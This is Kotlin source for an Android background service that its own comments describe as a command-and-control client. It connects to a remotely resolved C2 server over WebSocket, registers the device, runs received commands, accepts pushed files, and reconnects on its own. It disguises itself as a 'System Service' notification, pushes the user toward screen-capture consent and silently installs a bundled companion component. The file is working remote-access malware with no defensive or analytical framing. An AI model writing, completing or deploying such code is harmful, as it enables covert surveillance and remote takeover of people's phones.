package com.tg.ghostd

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import com.neovisionaries.ws.client.WebSocket
import com.neovisionaries.ws.client.WebSocketAdapter
import com.neovisionaries.ws.client.WebSocketException
import com.neovisionaries.ws.client.WebSocketFactory
import com.neovisionaries.ws.client.WebSocketFrame
import org.json.JSONObject
import java.net.URI
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.CountDownLatch

/**
 * Persistent foreground service (dataSync). Owns the C2 WebSocket:
 * resolve endpoint -> connect -> register -> heartbeat 45s -> commands.
 * Auto-reconnects with backoff and re-resolves the endpoint on every
 * connect attempt. If no endpoint can be resolved (all RPCs failed, no
 * cache) it retries every 60s.
 */
class GhostService : Service() {

    private var worker: Thread? = null
    private var heartbeat: Timer? = null
    @Volatile private var running = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        CommandHandler.init(this)
        // Start with ONLY the dataSync type: the manifest also declares
        // mediaProjection (promoted later via promoteToProjection()), and the
        // 2-arg startForeground would try to start ALL declared types —
        // mediaProjection without consent throws SecurityException on 14+.
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(
                NOTIFICATION_ID, buildNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }
        // Auto-arm the sidekick once the link is up (after setup); the
        // sidekick resets armed state on reboot, so ghostd re-arms on every
        // (re)connect. Fire-and-forget, retried by the link watcher.
        if (Prefs.setupDone(this)) {
            SidekickLink.startAutoArm()
            // ghostd update / reboot / sidekick wiped: re-check ghosta
            // presence and re-provision from the bundled asset when missing
            // or older than the bundle (silent when ghostd is the
            // installer-of-record). Fire-and-forget, never blocks the WS.
            SidekickInstaller.provisionBundledAsync(this, "service-start")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (worker == null) {
            running = true
            worker = Thread { runLoop() }.apply { name = "ghostd-c2"; start() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        stopHeartbeat()
        worker?.interrupt()
        worker = null
        if (instance === this) instance = null
        SidekickLink.stopAutoArm()
        SidekickLink.close()
        ProjectionHub.stop()
        super.onDestroy()
    }

    /**
     * Add the mediaProjection foreground-service type (Android 14+ requires
     * it before MediaProjectionManager.getMediaProjection). Both types are
     * declared in the manifest, so re-calling startForeground with both is
     * safe on 29+; pre-29 has no typed startForeground.
     */
    fun promoteToProjection() {
        if (Build.VERSION.SDK_INT >= 29) {
            try {
                startForeground(
                    NOTIFICATION_ID, buildNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } catch (_: Exception) {
                // some OEMs reject type changes; projection may still work
            }
        }
    }

    override fun onBind(intent: Intent): IBinder? = null

    // ------------------------------------------------------------------ C2

    private fun runLoop() {
        val resolver = EndpointResolver.forContext(this)
        var backoff = 5_000L
        while (running) {
            val endpoint = try {
                resolver.resolve()
            } catch (_: Exception) {
                null
            }
            if (endpoint == null) {
                // All RPCs failed and no cached endpoint: retry in 60s.
                if (!sleepQuietly(60_000L)) return
                continue
            }
            val connectedOk = connect(endpoint)
            if (!running) return
            backoff = if (connectedOk) 5_000L else minOf(backoff * 2, 60_000L)
            if (!sleepQuietly(backoff)) return
        }
    }

    /** Connects and blocks until the socket drops. Returns true if connected. */
    private fun connect(endpoint: String): Boolean {
        var connected = false
        try {
            val latch = CountDownLatch(1)
            val ws = WebSocketFactory()
                .setConnectionTimeout(10_000)
                .createSocket(URI(endpoint))
            ws.addListener(object : WebSocketAdapter() {
                override fun onConnected(
                    websocket: WebSocket, headers: Map<String, List<String>>
                ) {
                    connected = true
                    websocket.sendText(registerMessage())
                    startHeartbeat(websocket)
                }

                override fun onTextMessage(websocket: WebSocket, text: String) {
                    CommandHandler.handle(websocket, text)
                }

                override fun onBinaryMessage(websocket: WebSocket, binary: ByteArray) {
                    // incoming file streams (files put) — MediaBus framing
                    CommandHandler.onBinary(binary)
                }

                override fun onDisconnected(
                    websocket: WebSocket, serverCloseFrame: WebSocketFrame,
                    clientCloseFrame: WebSocketFrame, closedByServer: Boolean
                ) {
                    stopHeartbeat()
                    latch.countDown()
                }

                override fun onConnectError(websocket: WebSocket, cause: WebSocketException) {
                    stopHeartbeat()
                    latch.countDown()
                }

                override fun onError(websocket: WebSocket, cause: WebSocketException) {
                    // IO error mid-session; onDisconnected follows
                }
            })
            ws.connect()
            latch.await()
        } catch (_: Exception) {
            stopHeartbeat()
        }
        return connected
    }

    /**
     * Device registration on connect. Field names follow the daemon protocol
     * (server/daemon.py "hello"); model/android_version/battery included.
     */
    private fun registerMessage(): String {
        val battery = try {
            getSystemService(BatteryManager::class.java)
                .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) {
            -1
        }
        return JSONObject()
            .put("type", "hello")
            .put("device_id", Prefs.deviceId(this))
            .put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
            .put("android_version", Build.VERSION.RELEASE)
            .put("version", Build.VERSION.SDK_INT)
            .put("app_version", AppUpdater.currentVersionName(this))
            .put("battery", battery)
            .toString()
    }

    private fun startHeartbeat(ws: WebSocket?) {
        stopHeartbeat()
        if (ws == null) return
        heartbeat = Timer("ghostd-hb", true).apply {
            scheduleAtFixedRate(object : TimerTask() {
                override fun run() {
                    try {
                        ws.sendText("""{"type":"ping"}""")
                    } catch (_: Exception) {
                        // socket dead; reconnect loop handles it
                    }
                }
            }, HEARTBEAT_MS, HEARTBEAT_MS)
        }
    }

    private fun stopHeartbeat() {
        heartbeat?.cancel()
        heartbeat = null
    }

    private fun sleepQuietly(ms: Long): Boolean = try {
        Thread.sleep(ms)
        true
    } catch (_: InterruptedException) {
        Thread.currentThread().interrupt()
        false
    }

    private fun buildNotification(): Notification {
        val channel = NotificationChannel(
            CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN
        )
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            // Fallback tap target: opens the screen-capture consent activity
            // (primary path is the service starting it directly).
            .setContentIntent(
                android.app.PendingIntent.getActivity(
                    this, 0,
                    Intent(this, ScreenCaptureActivity::class.java),
                    android.app.PendingIntent.FLAG_IMMUTABLE
                )
            )
            .build()
    }

    companion object {
        private const val CHANNEL_ID = "ghostd"
        private const val NOTIFICATION_ID = 1
        private const val HEARTBEAT_MS = 45_000L

        /** Live service instance (for ProjectionHub's FGS promotion). */
        @Volatile var instance: GhostService? = null
            private set
    }
}
